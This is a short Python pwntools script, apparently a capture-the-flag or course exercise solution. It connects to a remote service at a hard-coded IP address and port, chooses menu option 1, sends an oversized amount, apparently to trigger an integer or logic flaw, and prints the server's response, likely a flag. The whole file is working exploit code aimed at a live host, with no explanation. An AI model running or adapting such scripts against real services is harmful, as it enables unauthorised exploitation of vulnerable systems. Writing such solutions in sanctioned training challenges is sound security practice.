#!/usr/bin/env python3
from pwn import *

p = remote('140.113.24.241', 30170)
p.sendlineafter(b'Input your choice:', b'1')
p.sendlineafter(b'Input the amount:', b'342442344')
p.recvline()
p.recvline()
print(p.recvline().decode())